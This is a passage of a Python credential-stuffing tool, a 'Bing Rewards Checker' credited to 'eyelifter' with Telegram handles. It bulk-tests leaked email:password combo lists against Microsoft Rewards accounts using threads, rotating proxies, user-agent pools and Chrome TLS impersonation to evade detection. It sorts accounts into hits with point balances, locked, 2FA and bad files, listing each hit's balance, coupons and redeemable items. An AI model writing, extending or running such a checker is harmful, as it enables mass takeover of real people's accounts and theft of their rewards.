        if _STOP.is_set():
            break
        for c in combos[i:i + cap]:
            if _STOP.is_set():
                break
            inflight.add(ex.submit(run_one, c))
        while len(inflight) >= cap:
            done, inflight = wait(inflight, timeout=0.4,
                                  return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=0.01)
                except Exception:
                    pass
    while inflight:
        done, inflight = wait(inflight, timeout=0.4,
                              return_when=FIRST_COMPLETED)
        for f in done:
            try:
                f.result(timeout=0.01)
            except Exception:
                pass


def bulk_run(combos):
    global _TOTAL, _FREE_F, _BAD_F, _LOCKED_F, _JSREQ_F, _2FA_F, _ERR_F, _JSON_F
    global _PROGRESS_ON, _FOLDER, _DBG_DIR

    reset_stats()
    _FOLDER = None
    _DBG_DIR = None
    _TOTAL = len(combos)

    d = folder()
    _FREE_F = open(os.path.join(d, "rewards_free.txt"), "w", encoding="utf-8")
    _BAD_F = open(os.path.join(d, "rewards_bad.txt"), "w", encoding="utf-8")
    _LOCKED_F = open(os.path.join(d, "rewards_locked.txt"), "w", encoding="utf-8")
    _JSREQ_F = open(os.path.join(d, "rewards_js_required.txt"), "w", encoding="utf-8")
    _2FA_F = open(os.path.join(d, "rewards_2fa.txt"), "w", encoding="utf-8")
    _ERR_F = open(os.path.join(d, "rewards_errors.txt"), "w", encoding="utf-8")
    _JSON_F = open(os.path.join(d, "rewards_hits_full.jsonl"), "w", encoding="utf-8")

    header = (f"# Bing Rewards Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
              f"# Seal: {SEAL_STR}\n\n")
    for fh in (_FREE_F, _BAD_F, _LOCKED_F, _JSREQ_F, _2FA_F, _ERR_F):
        fh.write(header)

    threads = _CFG.s["threads"]
    log("🚀", "INFO", "START", f"{_TOTAL} combos · {threads} threads")

    _STOP.clear()
    _PROGRESS_ON = bool(_CFG.s.get("show_progress", True)) and _ANSI
    if _PROGRESS_ON:
        threading.Thread(target=_progress_loop, daemon=True).start()

    ex = ThreadPoolExecutor(max_workers=threads)
    try:
        _submit_batch(ex, combos, threads)
    except KeyboardInterrupt:
        _STOP.set()
    finally:
        _STOP.set()
        try:
            ex.shutdown(wait=True, cancel_futures=True)
        except TypeError:
            ex.shutdown(wait=True)
        _PROGRESS_ON = False
        _clear_progress()

    for fh in (_FREE_F, _BAD_F, _LOCKED_F, _JSREQ_F, _2FA_F, _ERR_F, _JSON_F):
        try:
            fh.close()
        except Exception:
            pass

    with _BUCKET_LOCK:
        for bucket, fh in _BUCKET_FILES.items():
            try:
                fh.close()
            except Exception:
                pass
        bucket_snap = dict(_BUCKET_COUNTS)

    with _LK:
        snap = dict(_ST)

    for base, key in (
        ("rewards_free.txt", "free"),
        ("rewards_bad.txt", "bad"),
        ("rewards_locked.txt", "locked"),
        ("rewards_js_required.txt", "jsreq"),
        ("rewards_2fa.txt", "2fa"),
        ("rewards_errors.txt", "errors"),
    ):
        old = os.path.join(d, base)
        new = os.path.join(d, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    for bucket, count in bucket_snap.items():
        old = os.path.join(d, f"rewards_hits_{bucket}.txt")
        new = os.path.join(d, f"rewards_hits_{bucket}_{count}.txt")
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    el = time.time() - _START
    rows = [
        ("Total", _TOTAL),
        ("HIT (bal>0)", snap["hit"]),
        ("FREE (bal=0)", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Locked", snap["locked"]),
        ("JS Required", snap["jsreq"]),
        ("2FA", snap["2fa"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_TOTAL / max(el, 0.001):.2f} combo/s"),
    ]
    if bucket_snap:
        rows.append(("─" * 20, "─" * 8))
        for bucket in sorted(bucket_snap.keys(), key=bucket_key):
            rows.append((f"  hit {bucket}", bucket_snap[bucket]))
    rows.append(("Folder", d))
    rows.append(("Credit", f"eyelifter · {TG_USER} · {TG_CHAN}"))
    summary(rows)


def extract_combos(content):
    out = set()
    rx = re.compile(r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)')
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = rx.match(line)
        if m:
            out.add(f"{m.group(1).lower()}:{m.group(2)}")
    return sorted(out)


def ask_threads(default=None):
    default = default if default is not None else _CFG.s["threads"]
    section("THREADS")
    print(f"  current:  {_CFG.s['threads']}")
    print(f"  range:    1-{MAX_THREADS}")
    print(f"  enter to keep current")
    raw = input(f"{color('96', '[*] threads > ')}").strip()
    if not raw:
        return default
    try:
        t = int(raw)
    except ValueError:
        log("⚠️", "WARN", "THREADS", f"invalid, keeping {default}")
        return default
    t = max(1, min(MAX_THREADS, t))
    if t != _CFG.s["threads"]:
        _CFG.s["threads"] = t
        try:
            _CFG.save()
        except Exception:
            pass
    return t


def single_check(proxies):
    global _POOL, _BADP
    _STOP.clear()
    section("SINGLE CHECK")
    combo = input(f"{color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        log("✗", "ERROR", "INPUT", "invalid format")
        return
    proxy = None
    if proxies:
        if not _POOL:
            _POOL = list(proxies)
            _BADP = set()
        proxy = pick_proxy()
    log("🔍", "STEP", "CHECK", combo.split(":")[0])
    t0 = time.time()
    rl_wait()
    try:
        res = check_combo(combo, proxy)
    except Exception as e:
        log("✗", "ERROR", "CHECK", str(e)[:80])
        return
    el = time.time() - t0
    section("RESULT")
    st = res.status.upper()
    c = {"hit": "32", "free": "36", "bad": "31", "locked": "35",
         "jsreq": "33", "2fa": "33"}.get(res.status, "31")
    print(f"  {color(c, st, True)}")
    rows = [
        ("Email", res.email), ("Password", res.password),
    ]
    if res.status == "hit":
        rows += [
            ("Balance", f"{res.balance} points"),
            ("Level", f"{res.level} ({level_name(res.level) if res.level else '?'})"),
            ("Progress", f"{res.points_progress}/{res.points_requirement}" if res.points_progress is not None else "-"),
            ("Streak", f"{res.streak}/{res.streak_max}" if res.streak is not None else "-"),
            ("Points per Search", str(res.pps or "-")),
            ("Streak Bonus", str(res.streak_bonus or "-")),
            ("Prev Month", f"{res.prev_earned}/{res.prev_max}" if res.prev_earned else "-"),
            ("Member Title", res.member_title or "-"),
            ("Coupons", str(res.coupon_count or 0)),
            ("SKUs", str(res.sku_count or 0)),
        ]
    elif res.status == "free":
        rows += [
            ("Balance", "0 points"),
            ("Level", f"{res.level} ({level_name(res.level) if res.level else '?'})"),
        ]
    else:
        rows += [("Reason", res.reason or "-")]
    rows.append(("Time", f"{el:.2f}s"))
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {color('96', str(k).ljust(wk))}  {v}")


def bulk_check(proxies):
    global _POOL, _BADP
    _STOP.clear()
    section("BULK CHECK")
    path = input(f"{color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        log("✗", "ERROR", "FILE", "not found")
        return
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        combos = extract_combos(f.read())
    if not combos:
        log("✗", "ERROR", "EXTRACT", "no valid combos")
        return
    log("✓", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    ask_threads()

    if proxies:
        _POOL = list(proxies)
        _BADP = set()
        log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded")
    else:
        _POOL = []
        _BADP = set()
        log("⚠️", "WARN", "PROXY", "direct")

    try:
        bulk_run(combos)
    except KeyboardInterrupt:
        _STOP.set()
        log("🛑", "WARN", "STOP", "stopping...")


def settings_menu():
    section("SETTINGS")
    s = _CFG.s
    print(f"  [1]  Threads:              {s['threads']} (1-{MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxies File:         {s['proxies_file']}")
    print(f"  [6]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Debug:                {s['debug']}")
    print(f"  [9]  Hit Spacer:           {s['hit_spacer']}")
    print(f"  [10] Show Progress:        {s.get('show_progress', True)}")
    print(f"  [0]  Back")
    ch = input(f"{color('96', '[*] select > ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["rate_limit_delay"] = max(1, min(180, int(input("rate-limit delay: "))))
            changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "9":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "10":
            s["show_progress"] = not s.get("show_progress", True)
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        log("✗", "ERROR", "CONFIG", "invalid")
        return
    if changed:
        _CFG.save()
        log("💾", "INFO", "CONFIG", "saved")


def open_channel():
    try:
        import subprocess, shutil
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if shutil.which(cmd):
                subprocess.Popen(
                    [cmd, f"https://t.me/{TG_CHAN.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(f"https://t.me/{TG_CHAN.lstrip('@')}")
            return
        import webbrowser
        webbrowser.open(f"https://t.me/{TG_CHAN.lstrip('@')}")
    except Exception:
        pass


def main():
    verify("main")
    if _CFG.s.get("open_channel_on_launch", True):
        threading.Thread(target=open_channel, daemon=True).start()

    banner(TOOL, "Bing Rewards Checker")
    log("📣", "INFO", "CREDIT", f"eyelifter · {TG_USER} · {TG_CHAN}")
    log("🐛", "INFO", "DEBUG",
        f"{'ON' if _CFG.s.get('debug') else 'OFF'}")
    log("🧬", "INFO", "TLS",
        f"curl_cffi={'on' if _HAVE_CFFI else 'off'} · "
        f"impersonate=chrome131 · "
        f"ua_pool={len(UA_POOL)} · "
        f"ansi={'on' if _ANSI else 'off'} · "
        f"progress={'on' if _CFG.s.get('show_progress', True) else 'off'}")

    proxy_file = os.path.join(
        os.path.dirname(CFG_PATH),
        _CFG.s.get("proxies_file", "proxies.txt"))
    proxies = load_proxies(proxy_file)
    if proxies and not _CFG.s.get("skip_proxy_test", False):
        proxies = filter_proxies(proxies)

    while True:
        verify("menu")
        section(f"MAIN MENU · {TG_USER} · {TG_CHAN}")
        if proxies:
            log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies")
        else:
            log("⚠️", "WARN", "PROXY", "direct")
        log("⚙️", "INFO", "THREADS", f"{_CFG.s['threads']}")
        print("[1] Single check")
        print("[2] Bulk check")
        print("[3] Settings")
        print("[4] Exit")
        ch = input(f"{color('93', '[*] select > ')}").strip()

        if ch == "1":
            single_check(proxies)
        elif ch == "2":
            _STOP.clear()
            bulk_check(proxies)
        elif ch == "3":
            settings_menu()
            proxies = load_proxies(proxy_file)
            if proxies and not _CFG.s.get("skip_proxy_test", False):
                proxies = filter_proxies(proxies)
        elif ch == "4":
            print("Exiting...")
            return
        else:
            log("✗", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"[FATAL] {type(e).__name__}: {e}")